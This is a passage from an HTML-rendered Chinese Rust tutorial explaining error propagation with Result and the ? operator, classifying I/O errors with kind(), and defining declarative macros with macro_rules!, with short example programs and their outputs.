</span><span id="__span-114-5"><a id="__codelineno-114-5" name="__codelineno-114-5" href="#note-cs-rust-rust-__codelineno-114-5"></a>
</span><span id="__span-114-6"><a id="__codelineno-114-6" name="__codelineno-114-6" href="#note-cs-rust-rust-__codelineno-114-6"></a><span class="k">fn</span> <span class="nf">main</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-114-7"><a id="__codelineno-114-7" name="__codelineno-114-7" href="#note-cs-rust-rust-__codelineno-114-7"></a><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">r</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">f</span><span class="p">(</span><span class="mi">10000</span><span class="p">);</span>
</span><span id="__span-114-8"><a id="__codelineno-114-8" name="__codelineno-114-8" href="#note-cs-rust-rust-__codelineno-114-8"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="kd">let</span><span class="w"> </span><span class="nb">Ok</span><span class="p">(</span><span class="n">v</span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">r</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-114-9"><a id="__codelineno-114-9" name="__codelineno-114-9" href="#note-cs-rust-rust-__codelineno-114-9"></a><span class="w">        </span><span class="fm">println!</span><span class="p">(</span><span class="s">&quot;Ok: f(-1) = {}&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">v</span><span class="p">);</span>
</span><span id="__span-114-10"><a id="__codelineno-114-10" name="__codelineno-114-10" href="#note-cs-rust-rust-__codelineno-114-10"></a><span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-114-11"><a id="__codelineno-114-11" name="__codelineno-114-11" href="#note-cs-rust-rust-__codelineno-114-11"></a><span class="w">        </span><span class="fm">println!</span><span class="p">(</span><span class="s">&quot;Err&quot;</span><span class="p">);</span>
</span><span id="__span-114-12"><a id="__codelineno-114-12" name="__codelineno-114-12" href="#note-cs-rust-rust-__codelineno-114-12"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-114-13"><a id="__codelineno-114-13" name="__codelineno-114-13" href="#note-cs-rust-rust-__codelineno-114-13"></a><span class="p">}</span>
</span></code></pre></div>
运行结果
<div class="language-rust highlight"><pre><span></span><code><span id="__span-115-1"><a id="__codelineno-115-1" name="__codelineno-115-1" href="#note-cs-rust-rust-__codelineno-115-1"></a><span class="nb">Ok</span>: <span class="nc">f</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">10000</span>
</span></code></pre></div></p>
<p>我们再写一个传递错误的函数 g ：
<div class="language-rust highlight"><pre><span></span><code><span id="__span-116-1"><a id="__codelineno-116-1" name="__codelineno-116-1" href="#note-cs-rust-rust-__codelineno-116-1"></a><span class="k">fn</span> <span class="nf">g</span><span class="p">(</span><span class="n">i</span>: <span class="kt">i32</span><span class="p">)</span><span class="w"> </span>-&gt; <span class="nb">Result</span><span class="o">&lt;</span><span class="kt">i32</span><span class="p">,</span><span class="w"> </span><span class="kt">bool</span><span class="o">&gt;</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-116-2"><a id="__codelineno-116-2" name="__codelineno-116-2" href="#note-cs-rust-rust-__codelineno-116-2"></a><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">t</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">f</span><span class="p">(</span><span class="n">i</span><span class="p">);</span>
</span><span id="__span-116-3"><a id="__codelineno-116-3" name="__codelineno-116-3" href="#note-cs-rust-rust-__codelineno-116-3"></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="k">match</span><span class="w"> </span><span class="n">t</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-116-4"><a id="__codelineno-116-4" name="__codelineno-116-4" href="#note-cs-rust-rust-__codelineno-116-4"></a><span class="w">        </span><span class="nb">Ok</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="nb">Ok</span><span class="p">(</span><span class="n">i</span><span class="p">),</span>
</span><span id="__span-116-5"><a id="__codelineno-116-5" name="__codelineno-116-5" href="#note-cs-rust-rust-__codelineno-116-5"></a><span class="w">        </span><span class="nb">Err</span><span class="p">(</span><span class="n">b</span><span class="p">)</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="nb">Err</span><span class="p">(</span><span class="n">b</span><span class="p">)</span>
</span><span id="__span-116-6"><a id="__codelineno-116-6" name="__codelineno-116-6" href="#note-cs-rust-rust-__codelineno-116-6"></a><span class="w">    </span><span class="p">};</span>
</span><span id="__span-116-7"><a id="__codelineno-116-7" name="__codelineno-116-7" href="#note-cs-rust-rust-__codelineno-116-7"></a><span class="p">}</span>
</span></code></pre></div>
函数 g 传递了函数 f 可能出现的错误（这里的 g 只是一个简单的例子，实际上传递错误的函数一般还包含很多其它操作）。</p>
<p>Rust 中可以在 Result 对象后添加 ? 操作符将同类的 Err 直接传递出去：</p>
<p><div class="language-rust highlight"><pre><span></span><code><span id="__span-117-1"><a id="__codelineno-117-1" name="__codelineno-117-1" href="#note-cs-rust-rust-__codelineno-117-1"></a><span class="k">fn</span> <span class="nf">f</span><span class="p">(</span><span class="n">i</span>: <span class="kt">i32</span><span class="p">)</span><span class="w"> </span>-&gt; <span class="nb">Result</span><span class="o">&lt;</span><span class="kt">i32</span><span class="p">,</span><span class="w"> </span><span class="kt">bool</span><span class="o">&gt;</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-117-2"><a id="__codelineno-117-2" name="__codelineno-117-2" href="#note-cs-rust-rust-__codelineno-117-2"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nb">Ok</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="w"> </span><span class="p">}</span>
</span><span id="__span-117-3"><a id="__codelineno-117-3" name="__codelineno-117-3" href="#note-cs-rust-rust-__codelineno-117-3"></a><span class="w">    </span><span class="k">else</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nb">Err</span><span class="p">(</span><span class="kc">false</span><span class="p">)</span><span class="w"> </span><span class="p">}</span>
</span><span id="__span-117-4"><a id="__codelineno-117-4" name="__codelineno-117-4" href="#note-cs-rust-rust-__codelineno-117-4"></a><span class="p">}</span>
</span><span id="__span-117-5"><a id="__codelineno-117-5" name="__codelineno-117-5" href="#note-cs-rust-rust-__codelineno-117-5"></a>
</span><span id="__span-117-6"><a id="__codelineno-117-6" name="__codelineno-117-6" href="#note-cs-rust-rust-__codelineno-117-6"></a><span class="k">fn</span> <span class="nf">g</span><span class="p">(</span><span class="n">i</span>: <span class="kt">i32</span><span class="p">)</span><span class="w"> </span>-&gt; <span class="nb">Result</span><span class="o">&lt;</span><span class="kt">i32</span><span class="p">,</span><span class="w"> </span><span class="kt">bool</span><span class="o">&gt;</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-117-7"><a id="__codelineno-117-7" name="__codelineno-117-7" href="#note-cs-rust-rust-__codelineno-117-7"></a><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">t</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">f</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">?</span><span class="p">;</span>
</span><span id="__span-117-8"><a id="__codelineno-117-8" name="__codelineno-117-8" href="#note-cs-rust-rust-__codelineno-117-8"></a><span class="w">    </span><span class="nb">Ok</span><span class="p">(</span><span class="n">t</span><span class="p">)</span><span class="w"> </span><span class="c1">// 因为确定 t 不是 Err, t 在这里已经是 i32 类型</span>
</span><span id="__span-117-9"><a id="__codelineno-117-9" name="__codelineno-117-9" href="#note-cs-rust-rust-__codelineno-117-9"></a><span class="p">}</span>
</span><span id="__span-117-10"><a id="__codelineno-117-10" name="__codelineno-117-10" href="#note-cs-rust-rust-__codelineno-117-10"></a>
</span><span id="__span-117-11"><a id="__codelineno-117-11" name="__codelineno-117-11" href="#note-cs-rust-rust-__codelineno-117-11"></a><span class="k">fn</span> <span class="nf">main</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-117-12"><a id="__codelineno-117-12" name="__codelineno-117-12" href="#note-cs-rust-rust-__codelineno-117-12"></a><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">r</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">g</span><span class="p">(</span><span class="o">-</span><span class="mi">10000</span><span class="p">);</span>
</span><span id="__span-117-13"><a id="__codelineno-117-13" name="__codelineno-117-13" href="#note-cs-rust-rust-__codelineno-117-13"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="kd">let</span><span class="w"> </span><span class="nb">Ok</span><span class="p">(</span><span class="n">v</span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">r</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-117-14"><a id="__codelineno-117-14" name="__codelineno-117-14" href="#note-cs-rust-rust-__codelineno-117-14"></a><span class="w">        </span><span class="fm">println!</span><span class="p">(</span><span class="s">&quot;Ok: g(10000) = {}&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">v</span><span class="p">);</span>
</span><span id="__span-117-15"><a id="__codelineno-117-15" name="__codelineno-117-15" href="#note-cs-rust-rust-__codelineno-117-15"></a><span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-117-16"><a id="__codelineno-117-16" name="__codelineno-117-16" href="#note-cs-rust-rust-__codelineno-117-16"></a><span class="w">        </span><span class="fm">println!</span><span class="p">(</span><span class="s">&quot;Err&quot;</span><span class="p">);</span>
</span><span id="__span-117-17"><a id="__codelineno-117-17" name="__codelineno-117-17" href="#note-cs-rust-rust-__codelineno-117-17"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-117-18"><a id="__codelineno-117-18" name="__codelineno-117-18" href="#note-cs-rust-rust-__codelineno-117-18"></a><span class="p">}</span>
</span></code></pre></div>
运行结果为<code>Err</code></p>
<p>? 符的实际作用是将 Result 类非异常的值直接取出，如果有异常就将异常 Result 返回出去。所以，? 符仅用于返回值类型为 Result<T, E> 的函数，其中 E 类型必须和 ? 所处理的 Result 的 E 类型一致。</p>
<div class="admonition kind">
<p class="admonition-title">Kind</p>
<p>到此为止，Rust 似乎没有像 try 块一样可以令任何位置发生的同类异常都直接得到相同的解决的语法，但这样并不意味着 Rust 实现不了：我们完全可以把 try 块在独立的函数中实现，将所有的异常都传递出去解决。实际上这才是一个分化良好的程序应当遵循的编程方法：应该注重独立功能的完整性。</p>
<p>但是这样需要判断 Result 的 Err 类型，获取 Err 类型的函数是 kind()。</p>
<p><div class="language-rust highlight"><pre><span></span><code><span id="__span-118-1"><a id="__codelineno-118-1" name="__codelineno-118-1" href="#note-cs-rust-rust-__codelineno-118-1"></a><span class="k">use</span><span class="w"> </span><span class="n">std</span>::<span class="n">io</span><span class="p">;</span>
</span><span id="__span-118-2"><a id="__codelineno-118-2" name="__codelineno-118-2" href="#note-cs-rust-rust-__codelineno-118-2"></a><span class="k">use</span><span class="w"> </span><span class="n">std</span>::<span class="n">io</span>::<span class="n">Read</span><span class="p">;</span>
</span><span id="__span-118-3"><a id="__codelineno-118-3" name="__codelineno-118-3" href="#note-cs-rust-rust-__codelineno-118-3"></a><span class="k">use</span><span class="w"> </span><span class="n">std</span>::<span class="n">fs</span>::<span class="n">File</span><span class="p">;</span>
</span><span id="__span-118-4"><a id="__codelineno-118-4" name="__codelineno-118-4" href="#note-cs-rust-rust-__codelineno-118-4"></a>
</span><span id="__span-118-5"><a id="__codelineno-118-5" name="__codelineno-118-5" href="#note-cs-rust-rust-__codelineno-118-5"></a><span class="k">fn</span> <span class="nf">read_text_from_file</span><span class="p">(</span><span class="n">path</span>: <span class="kp">&amp;</span><span class="kt">str</span><span class="p">)</span><span class="w"> </span>-&gt; <span class="nb">Result</span><span class="o">&lt;</span><span class="nb">String</span><span class="p">,</span><span class="w"> </span><span class="n">io</span>::<span class="n">Error</span><span class="o">&gt;</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-118-6"><a id="__codelineno-118-6" name="__codelineno-118-6" href="#note-cs-rust-rust-__codelineno-118-6"></a><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="k">mut</span><span class="w"> </span><span class="n">f</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">File</span>::<span class="n">open</span><span class="p">(</span><span class="n">path</span><span class="p">)</span><span class="o">?</span><span class="p">;</span><span class="c1">//首先判断文件是否存在</span>
</span><span id="__span-118-7"><a id="__codelineno-118-7" name="__codelineno-118-7" href="#note-cs-rust-rust-__codelineno-118-7"></a><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="k">mut</span><span class="w"> </span><span class="n">s</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">String</span>::<span class="n">new</span><span class="p">();</span>
</span><span id="__span-118-8"><a id="__codelineno-118-8" name="__codelineno-118-8" href="#note-cs-rust-rust-__codelineno-118-8"></a><span class="w">    </span><span class="n">f</span><span class="p">.</span><span class="n">read_to_string</span><span class="p">(</span><span class="o">&amp;</span><span class="k">mut</span><span class="w"> </span><span class="n">s</span><span class="p">)</span><span class="o">?</span><span class="p">;</span><span class="c1">//判断是否读取失败</span>
</span><span id="__span-118-9"><a id="__codelineno-118-9" name="__codelineno-118-9" href="#note-cs-rust-rust-__codelineno-118-9"></a><span class="w">    </span><span class="nb">Ok</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
</span><span id="__span-118-10"><a id="__codelineno-118-10" name="__codelineno-118-10" href="#note-cs-rust-rust-__codelineno-118-10"></a><span class="p">}</span>
</span><span id="__span-118-11"><a id="__codelineno-118-11" name="__codelineno-118-11" href="#note-cs-rust-rust-__codelineno-118-11"></a>
</span><span id="__span-118-12"><a id="__codelineno-118-12" name="__codelineno-118-12" href="#note-cs-rust-rust-__codelineno-118-12"></a><span class="k">fn</span> <span class="nf">main</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-118-13"><a id="__codelineno-118-13" name="__codelineno-118-13" href="#note-cs-rust-rust-__codelineno-118-13"></a><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">str_file</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">read_text_from_file</span><span class="p">(</span><span class="s">&quot;hello.txt&quot;</span><span class="p">);</span>
</span><span id="__span-118-14"><a id="__codelineno-118-14" name="__codelineno-118-14" href="#note-cs-rust-rust-__codelineno-118-14"></a><span class="w">    </span><span class="k">match</span><span class="w"> </span><span class="n">str_file</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-118-15"><a id="__codelineno-118-15" name="__codelineno-118-15" href="#note-cs-rust-rust-__codelineno-118-15"></a><span class="w">        </span><span class="nb">Ok</span><span class="p">(</span><span class="n">s</span><span class="p">)</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="fm">println!</span><span class="p">(</span><span class="s">&quot;{}&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">s</span><span class="p">),</span>
</span><span id="__span-118-16"><a id="__codelineno-118-16" name="__codelineno-118-16" href="#note-cs-rust-rust-__codelineno-118-16"></a><span class="w">        </span><span class="nb">Err</span><span class="p">(</span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-118-17"><a id="__codelineno-118-17" name="__codelineno-118-17" href="#note-cs-rust-rust-__codelineno-118-17"></a><span class="w">            </span><span class="k">match</span><span class="w"> </span><span class="n">e</span><span class="p">.</span><span class="n">kind</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="c1">//根据kind分类</span>
</span><span id="__span-118-18"><a id="__codelineno-118-18" name="__codelineno-118-18" href="#note-cs-rust-rust-__codelineno-118-18"></a><span class="w">                </span><span class="n">io</span>::<span class="n">ErrorKind</span>::<span class="n">NotFound</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-118-19"><a id="__codelineno-118-19" name="__codelineno-118-19" href="#note-cs-rust-rust-__codelineno-118-19"></a><span class="w">                    </span><span class="fm">println!</span><span class="p">(</span><span class="s">&quot;No such file&quot;</span><span class="p">);</span>
</span><span id="__span-118-20"><a id="__codelineno-118-20" name="__codelineno-118-20" href="#note-cs-rust-rust-__codelineno-118-20"></a><span class="w">                </span><span class="p">},</span>
</span><span id="__span-118-21"><a id="__codelineno-118-21" name="__codelineno-118-21" href="#note-cs-rust-rust-__codelineno-118-21"></a><span class="w">                </span><span class="n">_</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-118-22"><a id="__codelineno-118-22" name="__codelineno-118-22" href="#note-cs-rust-rust-__codelineno-118-22"></a><span class="w">                    </span><span class="fm">println!</span><span class="p">(</span><span class="s">&quot;Cannot read the file&quot;</span><span class="p">);</span>
</span><span id="__span-118-23"><a id="__codelineno-118-23" name="__codelineno-118-23" href="#note-cs-rust-rust-__codelineno-118-23"></a><span class="w">                </span><span class="p">}</span>
</span><span id="__span-118-24"><a id="__codelineno-118-24" name="__codelineno-118-24" href="#note-cs-rust-rust-__codelineno-118-24"></a><span class="w">            </span><span class="p">}</span>
</span><span id="__span-118-25"><a id="__codelineno-118-25" name="__codelineno-118-25" href="#note-cs-rust-rust-__codelineno-118-25"></a><span class="w">        </span><span class="p">}</span>
</span><span id="__span-118-26"><a id="__codelineno-118-26" name="__codelineno-118-26" href="#note-cs-rust-rust-__codelineno-118-26"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-118-27"><a id="__codelineno-118-27" name="__codelineno-118-27" href="#note-cs-rust-rust-__codelineno-118-27"></a><span class="p">}</span>
</span></code></pre></div>
运行结果
<div class="language-text highlight"><pre><span></span><code><span id="__span-119-1"><a id="__codelineno-119-1" name="__codelineno-119-1" href="#note-cs-rust-rust-__codelineno-119-1"></a>No such file
</span></code></pre></div></p>
</div>
<h2 id="note-cs-rust-rust-_43">宏<a class="headerlink" href="#note-cs-rust-rust-_43" title="Permanent link">&para;</a></h2>
<p>Rust 宏（Macros）是一种在编译时生成代码的强大工具，它允许你在编写代码时创建自定义语法扩展。</p>
<p>宏（Macro）是一种在代码中进行元编程（Metaprogramming）的技术，它允许在编译时生成代码，宏可以帮助简化代码，提高代码的可读性和可维护性，同时允许开发者在编译时执行一些代码生成的操作。</p>
<p>宏在 Rust 中有两种类型：声明式宏（Declarative Macros）和过程宏（Procedural Macros）。</p>
<h3 id="note-cs-rust-rust-_44">定义宏<a class="headerlink" href="#note-cs-rust-rust-_44" title="Permanent link">&para;</a></h3>
<p>在 Rust 中，使用 <code>macro_rules!</code> 关键字来定义声明式宏。</p>
<p>主要格式为</p>
<div class="language-rust highlight"><pre><span></span><code><span id="__span-120-1"><a id="__codelineno-120-1" name="__codelineno-120-1" href="#note-cs-rust-rust-__codelineno-120-1"></a><span class="fm">macro_rules!</span><span class="w"> </span><span class="n">my_macro</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-120-2"><a id="__codelineno-120-2" name="__codelineno-120-2" href="#note-cs-rust-rust-__codelineno-120-2"></a><span class="w">    </span><span class="c1">// 模式匹配和展开</span>
</span><span id="__span-120-3"><a id="__codelineno-120-3" name="__codelineno-120-3" href="#note-cs-rust-rust-__codelineno-120-3"></a><span class="w">    </span><span class="p">(</span><span class="cp">$arg</span>:<span class="nc">expr</span><span class="p">)</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-120-4"><a id="__codelineno-120-4" name="__codelineno-120-4" href="#note-cs-rust-rust-__codelineno-120-4"></a><span class="w">        </span><span class="c1">// 生成的代码</span>
</span><span id="__span-120-5"><a id="__codelineno-120-5" name="__codelineno-120-5" href="#note-cs-rust-rust-__codelineno-120-5"></a><span class="w">        </span><span class="c1">// 使用 $arg 来代替匹配到的表达式</span>
</span><span id="__span-120-6"><a id="__codelineno-120-6" name="__codelineno-120-6" href="#note-cs-rust-rust-__codelineno-120-6"></a><span class="w">    </span><span class="p">};</span>
</span><span id="__span-120-7"><a id="__codelineno-120-7" name="__codelineno-120-7" href="#note-cs-rust-rust-__codelineno-120-7"></a><span class="p">}</span>
</span></code></pre></div>
<p>声明式宏使用 <code>macro_rules</code>! 关键字进行定义，它们被称为 "macro_rules" 宏。这种宏的定义是基于模式匹配的，可以匹配代码的结构并根据匹配的模式生成相应的代码。这样的宏在不引入新的语法结构的情况下，可以用来简化一些通用的代码模式。</p>
<p>这里有一个简单的例子</p>
<div class="admonition example">
<p class="admonition-title">Example</p>
<div class="language-rust highlight"><pre><span></span><code><span id="__span-121-1"><a id="__codelineno-121-1" name="__codelineno-121-1" href="#note-cs-rust-rust-__codelineno-121-1"></a><span class="w">    </span><span class="c1">// 宏的定义</span>
</span><span id="__span-121-2"><a id="__codelineno-121-2" name="__codelineno-121-2" href="#note-cs-rust-rust-__codelineno-121-2"></a><span class="fm">macro_rules!</span><span class="w"> </span><span class="n">greet</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-121-3"><a id="__codelineno-121-3" name="__codelineno-121-3" href="#note-cs-rust-rust-__codelineno-121-3"></a><span class="w">    </span><span class="c1">// 模式匹配</span>
</span><span id="__span-121-4"><a id="__codelineno-121-4" name="__codelineno-121-4" href="#note-cs-rust-rust-__codelineno-121-4"></a><span class="w">    </span><span class="p">(</span><span class="cp">$name</span>:<span class="nc">expr</span><span class="p">)</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-121-5"><a id="__codelineno-121-5" name="__codelineno-121-5" href="#note-cs-rust-rust-__codelineno-121-5"></a><span class="w">        </span><span class="c1">// 宏的展开</span>
</span><span id="__span-121-6"><a id="__codelineno-121-6" name="__codelineno-121-6" href="#note-cs-rust-rust-__codelineno-121-6"></a><span class="w">        </span><span class="fm">println!</span><span class="p">(</span><span class="s">&quot;Hello, {}!&quot;</span><span class="p">,</span><span class="w"> </span><span class="cp">$name</span><span class="p">);</span>
</span><span id="__span-121-7"><a id="__codelineno-121-7" name="__codelineno-121-7" href="#note-cs-rust-rust-__codelineno-121-7"></a><span class="w">    </span><span class="p">};</span>
</span><span id="__span-121-8"><a id="__codelineno-121-8" name="__codelineno-121-8" href="#note-cs-rust-rust-__codelineno-121-8"></a><span class="p">}</span>
</span><span id="__span-121-9"><a id="__codelineno-121-9" name="__codelineno-121-9" href="#note-cs-rust-rust-__codelineno-121-9"></a>
</span><span id="__span-121-10"><a id="__codelineno-121-10" name="__codelineno-121-10" href="#note-cs-rust-rust-__codelineno-121-10"></a><span class="k">fn</span> <span class="nf">main</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-121-11"><a id="__codelineno-121-11" name="__codelineno-121-11" href="#note-cs-rust-rust-__codelineno-121-11"></a><span class="w">    </span><span class="c1">// 调用宏</span>
</span><span id="__span-121-12"><a id="__codelineno-121-12" name="__codelineno-121-12" href="#note-cs-rust-rust-__codelineno-121-12"></a><span class="w">    </span><span class="n">greet</span><span class="o">!</span><span class="p">(</span><span class="s">&quot;World&quot;</span><span class="p">);</span>
</span><span id="__span-121-13"><a id="__codelineno-121-13" name="__codelineno-121-13" href="#note-cs-rust-rust-__codelineno-121-13"></a><span class="p">}</span>
</span></code></pre></div>
<p>定义宏 (<code>macro_rules! greet</code>)
<div class="language-rust highlight"><pre><span></span><code><span id="__span-122-1"><a id="__codelineno-122-1" name="__codelineno-122-1" href="#note-cs-rust-rust-__codelineno-122-1"></a><span class="fm">macro_rules!</span><span class="w"> </span><span class="n">greet</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-122-2"><a id="__codelineno-122-2" name="__codelineno-122-2" href="#note-cs-rust-rust-__codelineno-122-2"></a><span class="w">    </span><span class="c1">// 模式匹配</span>
</span><span id="__span-122-3"><a id="__codelineno-122-3" name="__codelineno-122-3" href="#note-cs-rust-rust-__codelineno-122-3"></a><span class="w">    </span><span class="p">(</span><span class="cp">$name</span>:<span class="nc">expr</span><span class="p">)</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-122-4"><a id="__codelineno-122-4" name="__codelineno-122-4" href="#note-cs-rust-rust-__codelineno-122-4"></a><span class="w">        </span><span class="c1">// 宏的展开</span>
</span><span id="__span-122-5"><a id="__codelineno-122-5" name="__codelineno-122-5" href="#note-cs-rust-rust-__codelineno-122-5"></a><span class="w">        </span><span class="fm">println!</span><span class="p">(</span><span class="s">&quot;Hello, {}!&quot;</span><span class="p">,</span><span class="w"> </span><span class="cp">$name</span><span class="p">);</span>
</span><span id="__span-122-6"><a id="__codelineno-122-6" name="__codelineno-122-6" href="#note-cs-rust-rust-__codelineno-122-6"></a><span class="w">    </span><span class="p">};</span>
</span><span id="__span-122-7"><a id="__codelineno-122-7" name="__codelineno-122-7" href="#note-cs-rust-rust-__codelineno-122-7"></a><span class="p">}</span>
</span></code></pre></div>
- <code>macro_rules! greet</code> 是宏定义的语法。在 Rust 中，宏是一种用于生成代码的机制。
- <code>greet</code> 是宏的名字。
- <code>($name:expr)</code> 是宏的模式匹配部分。这里匹配一个表达式（<code>expr</code>），并将其绑定到 <code>$name</code> 上。
- <code>=&gt; { ... }</code> 是宏的展开部分。当宏被调用时，匹配到的表达式会被插入到这个位置。在这个例子中，它会展开成一条 <code>println!</code> 语句，输出一个带有变量 <code>$name</code> 的字符串。</p>
<ol>
<li>使用宏
<div class="language-rust highlight"><pre><span></span><code><span id="__span-123-1"><a id="__codelineno-123-1" name="__codelineno-123-1" href="#note-cs-rust-rust-__codelineno-123-1"></a><span class="k">fn</span> <span class="nf">main</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-123-2"><a id="__codelineno-123-2" name="__codelineno-123-2" href="#note-cs-rust-rust-__codelineno-123-2"></a><span class="w">    </span><span class="c1">// 调用宏</span>
</span><span id="__span-123-3"><a id="__codelineno-123-3" name="__codelineno-123-3" href="#note-cs-rust-rust-__codelineno-123-3"></a><span class="w">    </span><span class="n">greet</span><span class="o">!</span><span class="p">(</span><span class="s">&quot;World&quot;</span><span class="p">);</span>
</span><span id="__span-123-4"><a id="__codelineno-123-4" name="__codelineno-123-4" href="#note-cs-rust-rust-__codelineno-123-4"></a><span class="p">}</span>
</span></code></pre></div></li>
<li><code>fn main()</code> 是程序的入口函数。</li>
<li><code>greet!("World");</code> 是对宏 <code>greet</code> 的调用。在调用时，<code>"World"</code> 这个字符串字面量会被传递给宏中的 <code>$name</code>。</li>
</ol>
<p>在编译时，宏会被展开成常规代码。对于这段代码来说，<code>greet!("World");</code> 会展开成：
<div class="language-rust highlight"><pre><span></span><code><span id="__span-124-1"><a id="__codelineno-124-1" name="__codelineno-124-1" href="#note-cs-rust-rust-__codelineno-124-1"></a><span class="fm">println!</span><span class="p">(</span><span class="s">&quot;Hello, {}!&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;World&quot;</span><span class="p">);</span>
</span></code></pre></div>
最终运行时会打印出：
<div class="language-text highlight"><pre><span></span><code><span id="__span-125-1"><a id="__codelineno-125-1" name="__codelineno-125-1" href="#note-cs-rust-rust-__codelineno-125-1"></a>Hello, World!
</span></code></pre></div></p>
</div>
<p>下面是一个更复杂的例子</p>
<div class="admonition example">
<p class="admonition-title">Example</p>
<div class="language-rust highlight"><pre><span></span><code><span id="__span-126-1"><a id="__codelineno-126-1" name="__codelineno-126-1" href="#note-cs-rust-rust-__codelineno-126-1"></a><span class="w">    </span><span class="c1">// 宏的定义</span>
</span><span id="__span-126-2"><a id="__codelineno-126-2" name="__codelineno-126-2" href="#note-cs-rust-rust-__codelineno-126-2"></a><span class="fm">macro_rules!</span><span class="w"> </span><span class="n">vec</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-126-3"><a id="__codelineno-126-3" name="__codelineno-126-3" href="#note-cs-rust-rust-__codelineno-126-3"></a><span class="w">    </span><span class="c1">// 基本情况，空的情况</span>
</span><span id="__span-126-4"><a id="__codelineno-126-4" name="__codelineno-126-4" href="#note-cs-rust-rust-__codelineno-126-4"></a><span class="w">    </span><span class="p">()</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-126-5"><a id="__codelineno-126-5" name="__codelineno-126-5" href="#note-cs-rust-rust-__codelineno-126-5"></a><span class="w">        </span><span class="nb">Vec</span>::<span class="n">new</span><span class="p">()</span>
</span><span id="__span-126-6"><a id="__codelineno-126-6" name="__codelineno-126-6" href="#note-cs-rust-rust-__codelineno-126-6"></a><span class="w">    </span><span class="p">};</span>
</span><span id="__span-126-7"><a id="__codelineno-126-7" name="__codelineno-126-7" href="#note-cs-rust-rust-__codelineno-126-7"></a>
</span><span id="__span-126-8"><a id="__codelineno-126-8" name="__codelineno-126-8" href="#note-cs-rust-rust-__codelineno-126-8"></a><span class="w">    </span><span class="c1">// 递归情况，带有元素的情况</span>
</span><span id="__span-126-9"><a id="__codelineno-126-9" name="__codelineno-126-9" href="#note-cs-rust-rust-__codelineno-126-9"></a><span class="w">    </span><span class="p">(</span><span class="cp">$($element</span>:<span class="nc">expr</span><span class="p">),</span><span class="o">+</span><span class="w"> </span><span class="cp">$(,</span><span class="p">)</span><span class="o">?</span><span class="p">)</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="p">{</span>
